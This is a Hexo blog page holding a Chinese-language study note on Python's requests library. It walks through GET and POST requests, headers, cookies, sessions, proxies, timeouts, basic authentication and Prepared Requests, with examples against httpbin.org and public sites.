<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-requests库的学习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="article-date">
  <time class="dt-published" datetime="2025-04-21T12:13:41.000Z" itemprop="datePublished">2025-04-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/">requests库的学习</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="request库通俗理解"><a href="#request库通俗理解" class="headerlink" title="request库通俗理解"></a>request库通俗理解</h3><h4 id="1-request库的作用"><a href="#1-request库的作用" class="headerlink" title="# 1.request库的作用"></a># 1.request库的作用</h4><p>requests库就像是一个能干的 “跑腿助手”。在现实生活中，如果你要去商店拿东西，可能会亲自走过去，但在网络世界里，有很多复杂的步骤和规则，而requests库就帮你处理这些复杂的事情，让你可以轻松地从网络上获取信息。</p>
<h4 id="2-GET-请求的含义"><a href="#2-GET-请求的含义" class="headerlink" title="*2. GET 请求的含义*"></a><em><strong>*2. GET 请求的含义*</strong></em></h4><p>GET 请求就相当于你跟商店店员说 “我想要某个东西”。在网络里，这个 “东西” 就是网页、图片、数据等资源。当你使用requests.get()方法并提供一个网址（比如<a target="_blank" rel="noopener" href="https://www.baidu.com)时,就好像你告诉店员/">https://www.baidu.com）时，就好像你告诉店员</a> “我要这家店（对应网址的服务器）的东西”。</p>
<h4 id="3-发送请求和获取响应"><a href="#3-发送请求和获取响应" class="headerlink" title="*3. 发送请求和获取响应*"></a><em><strong>*3. 发送请求和获取响应*</strong></em></h4><p>当你执行r &#x3D; requests.get(‘<a target="_blank" rel="noopener" href="https://www.baidu.com')这行代码时,就相当于你让/">https://www.baidu.com&#39;)这行代码时，就相当于你让</a> “跑腿助手”（requests库）去对应的 “商店”（服务器），并说出你想要的东西（发送 GET 请求）。然后 “跑腿助手” 会去那家 “商店”，把商店给的东西带回来。这个带回来的 “东西” 就存放在变量r里，它包含了服务器给你的各种信息，比如商品是不是成功拿到了（状态码）、商品具体是什么样子（响应内容）等。</p>
<h4 id="4-后续处理"><a href="#4-后续处理" class="headerlink" title="*4. 后续处理*"></a><em><strong>*4. 后续处理*</strong></em></h4><p>拿到 “东西” 后，你就可以看看这个 “东西” 怎么样。在代码里，你可以通过r.status_code查看请求是否成功（就像看看店员是不是把你要的东西给你了），通过r.text查看具体的内容（就像看看拿到的东西长啥样）。</p>
<p> 举个例子，假如你想要看某个新闻网站上的新闻，你就可以让requests这个 “跑腿助手” 去对应的新闻网站 “商店”，把新闻页面 “拿” 回来，然后你就能在自己的程序里查看这些新闻内容了。</p>
<p>用get请求去访问一个网站</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入requests库</span></span><br><span class="line">import requests</span><br><span class="line"><span class="comment">#发送一个get请求并得到响应</span></span><br><span class="line">r = requests.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="comment">#查看响应对象的类型</span></span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">type</span>(r))</span><br><span class="line"><span class="comment">#查看响应状态码</span></span><br><span class="line"><span class="keyword">print</span>(r.status_code)</span><br><span class="line"><span class="comment">#查看响应内容的类型</span></span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">type</span>(r.text))</span><br><span class="line"><span class="comment">#查看响应的内容</span></span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br><span class="line"><span class="comment">#查看cookies</span></span><br><span class="line"><span class="keyword">print</span>(r.cookies)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果要添加请求参数，比如添加两个请求参数，其中name值是germey，age值是20</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;germey&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;age&#x27;</span>:<span class="number">22</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>,params=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">params=data` 是将之前定义的 `data` 字典作为查询参数添加到请求的 URL 中。也就是说，最终发送的请求 URL 会变成 `http://httpbin.org/get?name=germey&amp;age=22</span><br></pre></td></tr></table></figure>



<h3 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h3><h4 id="组成部分"><a href="#组成部分" class="headerlink" title="组成部分"></a>组成部分</h4><p><code>User-Agent</code> 字符串通常由多个部分组成，不同类型的客户端其格式会有所差异，但大致包含以下几类信息：</p>
<ul>
<li><strong>浏览器信息</strong>：如浏览器名称和版本号。例如 <code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</code> ，这里表明浏览器是 Chrome 114 版本。</li>
<li><strong>操作系统信息</strong>：显示客户端使用的操作系统及其版本。上述示例中的 <code>Windows NT 10.0</code> 就表示使用的是 Windows 10 操作系统。</li>
<li><strong>渲染引擎信息</strong>：像 <code>AppleWebKit/537.36</code> 体现了使用的是 WebKit 渲染引擎及其版本。</li>
</ul>
<h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><h4 id="1-服务器适配"><a href="#1-服务器适配" class="headerlink" title="1. 服务器适配"></a>1. 服务器适配</h4><p>服务器可以根据 <code>User-Agent</code> 判断客户端类型，然后返回适合该客户端的内容。比如，对于手机浏览器，服务器可以返回移动端适配的页面，提供更好的浏览体验；对于搜索引擎爬虫，服务器可以返回适合被索引的内容。</p>
<h4 id="2-统计分析"><a href="#2-统计分析" class="headerlink" title="2. 统计分析"></a>2. 统计分析</h4><p>网站管理员可以通过分析 <code>User-Agent</code> 数据，了解访问者使用的设备和浏览器情况，为网站的优化和推广提供数据支持。例如，如果发现大部分用户使用的是某一款特定浏览器，就可以针对该浏览器进行重点测试和优化。</p>
<h4 id="3-反爬虫和安全防护"><a href="#3-反爬虫和安全防护" class="headerlink" title="3. 反爬虫和安全防护"></a>3. 反爬虫和安全防护</h4><p>部分网站会依据 <code>User-Agent</code> 来识别是否为正常的浏览器访问。如果 <code>User-Agent</code> 显示为明显的爬虫程序，网站可能会采取限制访问、封禁 IP 等措施。同时，异常的 <code>User-Agent</code> 也可能被视为潜在的安全威胁。</p>
<p>可以用request库 改user-agent 让服务器误认为是正常的浏览器访问</p>
<h3 id="常见的请求头信息"><a href="#常见的请求头信息" class="headerlink" title="常见的请求头信息"></a>常见的请求头信息</h3><ul>
<li><strong>Content-Type</strong>：指示返回内容的类型，例如 <code>text/html</code> 表示返回的是 HTML 文档。</li>
<li><strong>Content-Length</strong>：表示响应内容的长度（以字节为单位）。</li>
<li><strong>Server</strong>：标识服务器的类型和版本，如 <code>Apache</code> 或 <code>nginx</code> 等。</li>
<li><strong>Date</strong>：服务器生成响应的日期和时间。</li>
<li><strong>Connection</strong>：表示连接状态，如 <code>keep - alive</code> 表示连接将被保持，以便后续请求复用。</li>
</ul>
<h3 id="用requests库爬取二进制数据"><a href="#用requests库爬取二进制数据" class="headerlink" title="用requests库爬取二进制数据"></a>用requests库爬取二进制数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#向资源URL发送一个GET请求</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;https://www.baidu.com/favicon.ico&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;favicon.ico&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(r.content)</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>&#39;https://www.baidu.com/favicon.ico&#39;</code> 是请求的目标 URL，<code>favicon.ico</code> 通常是网站的图标文件，用于在浏览器的标签页、书签栏等位置显示网站的标志。</p>
</li>
<li><p>这行代码会向百度服务器发送一个 GET 请求，请求获取百度的图标文件，并将服务器返回的响应对象赋值给变量 <code>r</code>。</p>
</li>
<li><p><code>open()</code> 是 Python 内置的用于打开文件的函数。</p>
</li>
<li><p><code>&#39;favicon.ico&#39;</code> 是要保存的文件名，即把下载的图标文件保存为本地的 <code>favicon.ico</code> 文件。</p>
</li>
<li><p><code>&#39;wb&#39;</code> 是文件打开模式，其中 <code>w</code> 表示写入模式，<code>b</code> 表示以二进制模式打开文件。因为图标文件是二进制文件，所以需要以二进制模式进行写入。</p>
</li>
<li><p><code>with</code> 语句用于创建一个上下文管理器，它会自动处理文件的打开和关闭操作，确保在代码块执行完毕后文件被正确关闭，避免资源泄漏。</p>
</li>
<li><p><code>as f</code> 把 <code>open(&#39;favicon.ico&#39;, &#39;wb&#39;)</code> 返回的文件对象赋值给变量 <code>f</code>。之后在 <code>with</code> 语句块里，你就可以使用 <code>f</code> 来调用文件对象的方法，比如 <code>f.write()</code> 用于向文件写入数据</p>
</li>
<li><p><code>r.content</code> 是响应对象 <code>r</code> 的一个属性，它返回服务器响应内容的字节形式。</p>
</li>
<li><p><code>f.write()</code> 是文件对象 <code>f</code> 的方法，用于将字节数据写入文件。这行代码将下载的图标文件的字节数据写入到本地的 <code>favicon.ico</code> 文件中。</p>
</li>
</ul>
<p>这段代码通过 <code>requests</code> 库发送 GET 请求从百度网站下载其图标文件，并使用 Python 的文件操作将图标文件保存为本地的 <code>favicon.ico</code> 文件。执行这段代码后，在当前工作目录下会生成一个名为 <code>favicon.ico</code> 的文件，该文件即为百度的图标</p>
<h3 id="用requests库实现文件上传"><a href="#用requests库实现文件上传" class="headerlink" title="用requests库实现文件上传"></a>用requests库实现文件上传</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#以二进制方式读取当前目录下的favicon.ico文件，并将其赋给file</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;favicon.ico&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line"><span class="comment">#进行上传</span></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://httpbin.org/post&#x27;</span>,files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="处理Cookie"><a href="#处理Cookie" class="headerlink" title="处理Cookie"></a>处理Cookie</h3><p><img src="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20250421210254912.png" alt="image-20250421210254912"></p>
<p><img src="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20250421210326218.png" alt="image-20250421210326218"></p>
<h3 id="会话维持"><a href="#会话维持" class="headerlink" title="会话维持"></a>会话维持</h3><p><img src="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20250421212624763.png" alt="image-20250421212624763"></p>
<h4 id="s-requests-Session"><a href="#s-requests-Session" class="headerlink" title="s = requests.Session()"></a><code>s = requests.Session()</code></h4><p>调用 <code>requests.Session()</code> 函数创建一个会话对象 <code>s</code>。会话对象能在多次请求间保持状态，像 Cookie 信息、连接等，让后续的请求可以复用之前建立的连接，并且自动处理 Cookie 的存储和发送。</p>
<h4 id="s-get-http-httpbin-org-cookies-set-number-123456789"><a href="#s-get-http-httpbin-org-cookies-set-number-123456789" class="headerlink" title="s.get(&#39;http://httpbin.org/cookies/set/number/123456789&#39;)"></a><code>s.get(&#39;http://httpbin.org/cookies/set/number/123456789&#39;)</code></h4><ul>
<li>使用会话对象 <code>s</code> 的 <code>get</code> 方法发送一个 GET 请求到 <code>http://httpbin.org/cookies/set/number/123456789</code>。</li>
<li><code>httpbin.org</code> 是一个专门用于测试 HTTP 请求和响应的网站，<code>/cookies/set/number/123456789</code> 这个接口的作用是设置一个名为 <code>number</code>、值为 <code>123456789</code> 的 Cookie。由于使用的是会话对象，这个 Cookie 会被自动保存到会话中。</li>
</ul>
<h4 id="r-s-get-http-httpbin-org-cookies"><a href="#r-s-get-http-httpbin-org-cookies" class="headerlink" title="r = s.get(&#39;http://httpbin.org/cookies&#39;)"></a><code>r = s.get(&#39;http://httpbin.org/cookies&#39;)</code></h4><ul>
<li>再次使用会话对象 <code>s</code> 的 <code>get</code> 方法发送一个 GET 请求到 <code>http://httpbin.org/cookies</code>。</li>
<li><code>/cookies</code> 接口的功能是返回当前会话中的所有 Cookie 信息。服务器的响应会被存储在响应对象 <code>r</code> 中</li>
</ul>
<h3 id="SSL证书验证"><a href="#SSL证书验证" class="headerlink" title="SSL证书验证"></a>SSL证书验证</h3><p><img src="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20250421213113557.png" alt="image-20250421213113557"></p>
<p><img src="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20250421213126517.png" alt="image-20250421213126517"></p>
<p>代理设置<br>对于某些网站，在测试的时候请求几次，能正常获取内容。但是一旦开始大规模、频繁地爬取，网站可能会弹出验证码，或者跳转到登录验证页面，更有甚者可能会直接封禁客户端的IP，导致一定时间内无法访问。为了防止这种情况，我们需要使用代理来解决这个问题，这就需要用到proxies                  </p>
<p>1)设置代理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  	<span class="comment">#该代理服务器在免费代理网站上得到的，这样的网站有很多</span></span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://161.35.4.201:80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;https://161.35.4.201:80&#x27;</span> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Error&#x27;</span>, e.args)</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>proxies</code> 是一个字典，其键值对指定了不同协议（<code>http</code> 和 <code>https</code>）对应的代理服务器地址。</p>
</li>
<li><p><code>&#39;http&#39;: &#39;http://161.35.4.201:80&#39;</code> 表明当发送 HTTP 请求时，会使用 <code>161.35.4.201</code> 这个 IP 地址、端口号为 <code>80</code> 的代理服务器。</p>
</li>
<li><p><code>&#39;https&#39;: &#39;https://161.35.4.201:80&#39;</code> 意味着发送 HTTPS 请求时，同样会使用该代理服务器。</p>
</li>
<li><p><code>try</code> 块</p>
<p>：</p>
<ul>
<li><code>requests.get(&#39;http://httpbin.org/get&#39;, proxies=proxies)</code>：调用 <code>requests</code> 库的 <code>get</code> 方法发送一个 GET 请求到 <code>http://httpbin.org/get</code>，并通过 <code>proxies</code> 参数指定使用之前定义的代理服务器。</li>
<li><code>print(response.text)</code>：若请求成功，将服务器返回的响应内容以字符串形式打印出来。<code>httpbin.org</code> 的 <code>/get</code> 接口会返回包含请求信息（如请求头、请求参数等）的 JSON 数据。</li>
</ul>
</li>
<li><p><code>except</code> 块</p>
<p>：</p>
<ul>
<li><code>except requests.exceptions.ConnectionError as e</code>：捕获可能出现的连接错误异常。当无法连接到代理服务器或者目标服务器时，会抛出 <code>ConnectionError</code> 异常。</li>
<li><code>print(&#39;Error&#39;, e.args)</code>：若捕获到异常，打印错误信息，<code>e.args</code> 包含了异常的详细参数</li>
</ul>
</li>
</ul>
<p>超时设置<br>在本机网络状况不好或者服务器网络响应太慢甚至无响应时，我们可能会等待特别久的时间才可能收到响应，甚至到最后收不到响应而报错。为了应对这种情况，应设置一个超时时间，这个时间是计算机发出请求到服务器返回响应的时间，如果请求超过了这个超时时间还没有得到响应，就抛出错误。这就需要使用timeout参数实现，单位为秒</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）指定请求总的超时时间</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#向淘宝发出请求，如果1秒内没有得到响应，则抛出错误</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;https://www.taobao.com&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br></pre></td></tr></table></figure>

<p>2）分别指定超时时间。实际上，请求分为两个阶段：连接（connect）和读取（read）。如果给timeout参数指定一个整数值，则超时时 间是这两个阶段的总和；如果要分别指定，就可以传入一个元组，连接超时时间和读取超时时间</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#向淘宝发出请求，如果连接阶段5秒内没有得到响应或读取阶段30秒内没有得到响应，则抛出错误</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;https://www.taobao.com&#x27;</span>,timeout=(<span class="number">5</span>,<span class="number">30</span>))</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br></pre></td></tr></table></figure>

<p>3）如果想永久等待，可以直接timeout设置为None，或者不设置timeout参数，因为它的默认值就是None。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#向淘宝发出请求，如果连接阶段5秒内没有得到响应或读取阶段30秒内没有得到响应，则抛出错误</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;https://www.taobao.com&#x27;</span>,timeout=<span class="literal">None</span>))</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br></pre></td></tr></table></figure>

<h3 id="身份验证"><a href="#身份验证" class="headerlink" title="身份验证"></a>身份验证</h3><p><img src="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20250421214027917.png" alt="image-20250421214027917"></p>
<p>1）此时可以使用requests自带的身份验证功能，通过HTTPBasicAuth类实现。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://localhost:8080/manager/html&#x27;</span>,auth=HTTPBasicAuth(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br></pre></td></tr></table></figure>

<p> 如果用户名和密码正确的话，返回200状态码；如果不正确，则返回401状态码。也可以不使用HTTPBasicAuth类，而是直接传入一个 元组，它会默认使用HTTPBasicAuth这个类来验证</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://localhost:8080/manager/html&#x27;</span>,auth=(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br></pre></td></tr></table></figure>

<h2 id="Prepared-Request"><a href="#Prepared-Request" class="headerlink" title="Prepared Request"></a>Prepared Request</h2><p>在学习urllib库时，发送请求如果需要设置请求头，需要通过一个Request对象来表示。在requests库中，存在一个与之类似的类，称为Prepared Request。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request,Session</span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;germey&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">	<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">s = Session()</span><br><span class="line">req = Request(<span class="string">&#x27;POST&#x27;</span>,url,data=data,headers=headers)</span><br><span class="line">prepped = s.prepare_request(req)</span><br><span class="line">r = s.send(prepped)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h4 id="1-from-requests-import-Request-Session"><a href="#1-from-requests-import-Request-Session" class="headerlink" title="1. from requests import Request, Session"></a>1. <code>from requests import Request, Session</code></h4><p>从 <code>requests</code> 库中导入 <code>Request</code> 和 <code>Session</code> 类。<code>Request</code> 类用于构建 HTTP 请求对象，<code>Session</code> 类用于管理会话，它可以在多个请求之间保持状态，例如 Cookie 信息。</p>
<h4 id="2-url-http-httpbin-org-post"><a href="#2-url-http-httpbin-org-post" class="headerlink" title="2. url = &#39;http://httpbin.org/post&#39;"></a>2. <code>url = &#39;http://httpbin.org/post&#39;</code></h4><p>定义请求的目标 URL，即要发送 POST 请求的地址。</p>
<h4 id="3-data-name-germey"><a href="#3-data-name-germey" class="headerlink" title="3. data = {&#39;name&#39;: &#39;germey&#39;}"></a>3. <code>data = &#123;&#39;name&#39;: &#39;germey&#39;&#125;</code></h4><p>定义一个字典 <code>data</code>，其中包含要随请求发送的数据。在这个例子中，数据是一个键值对 <code>&#123;&#39;name&#39;: &#39;germey&#39;&#125;</code>，表示要发送的参数 <code>name</code> 的值为 <code>germey</code>。</p>
<h4 id="4-headers-User-Agent-Mozilla-5-0-Windows-NT-10-0-Win64-x64-rv-95-0-Gecko-20100101-Firefox-95-0"><a href="#4-headers-User-Agent-Mozilla-5-0-Windows-NT-10-0-Win64-x64-rv-95-0-Gecko-20100101-Firefox-95-0" class="headerlink" title="4. headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0&#39;}"></a>4. <code>headers = &#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0&#39;&#125;</code></h4><p>定义一个字典 <code>headers</code>，其中包含要随请求发送的请求头信息。<code>User-Agent</code> 是一个常见的请求头字段，用于标识客户端的类型和版本信息。这里模拟了 Firefox 浏览器的用户代理信息，让服务器认为请求是由 Firefox 浏览器发出的。</p>
<h4 id="5-s-Session"><a href="#5-s-Session" class="headerlink" title="5. s = Session()"></a>5. <code>s = Session()</code></h4><p>创建一个 <code>Session</code> 对象 <code>s</code>，用于管理会话。通过会话对象发送请求可以自动处理 Cookie 等状态信息。</p>
<h4 id="6-req-Request-POST-url-data-data-headers-headers"><a href="#6-req-Request-POST-url-data-data-headers-headers" class="headerlink" title="6. req = Request(&#39;POST&#39;, url, data=data, headers=headers)"></a>6. <code>req = Request(&#39;POST&#39;, url, data=data, headers=headers)</code></h4><p>创建一个 <code>Request</code> 对象 <code>req</code>，用于构建 HTTP 请求。</p>
<ul>
<li><code>&#39;POST&#39;</code> 表示请求的方法为 POST。</li>
<li><code>url</code> 是请求的目标 URL。</li>
<li><code>data=data</code> 表示将之前定义的 <code>data</code> 字典作为请求的数据发送。</li>
<li><code>headers=headers</code> 表示将之前定义的 <code>headers</code> 字典作为请求头信息发送。</li>
</ul>
<h4 id="7-prepped-s-prepare-request-req"><a href="#7-prepped-s-prepare-request-req" class="headerlink" title="7. prepped = s.prepare_request(req)"></a>7. <code>prepped = s.prepare_request(req)</code></h4><p>调用 <code>Session</code> 对象的 <code>prepare_request</code> 方法，将 <code>Request</code> 对象 <code>req</code> 准备为一个可以发送的请求对象 <code>prepped</code>。这个步骤会对请求进行一些预处理，例如设置默认的请求头、处理编码等。</p>
<h4 id="8-r-s-send-prepped"><a href="#8-r-s-send-prepped" class="headerlink" title="8. r = s.send(prepped)"></a>8. <code>r = s.send(prepped)</code></h4><p>调用 <code>Session</code> 对象的 <code>send</code> 方法，发送准备好的请求对象 <code>prepped</code>，并将服务器返回的响应对象赋值给变量 <code>r</code>。</p>
<h4 id="9-print-r-text"><a href="#9-print-r-text" class="headerlink" title="9. print(r.text)"></a>9. <code>print(r.text)</code></h4><p>打印服务器返回的响应内容，<code>r.text</code> 是响应对象 <code>r</code> 的一个属性，它返回服务器返回的响应内容，以字符串形式呈现。</p>
<p>这里引入了Request，然后用url、data和headers参数构造了一个Request对象，这时需要再调用Session的prepare_request( )方法将其转换为一个Prepared Request对象，然后调用send( )方法发送。这样做的好处时：可以利用Request将请求当作独立的对象来看待，这样在进行队列调度时会非常方便，后面会用它来构造一个Request队列<br>这段代码通过 <code>Request</code> 和 <code>Session</code> 类手动构建并发送了一个 HTTP POST 请求，展示了如何使用 <code>requests</code> 库的高级功能来精细控制请求的构建和发送过程。与直接使用 <code>requests.post()</code> 方法相比，这种方式可以更灵活地处理请求和会话状态。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_43404934/article/details/122331463">https://blog.csdn.net/m0_43404934/article/details/122331463</a></p>

      
    </div>
    <footer class="article-footer">
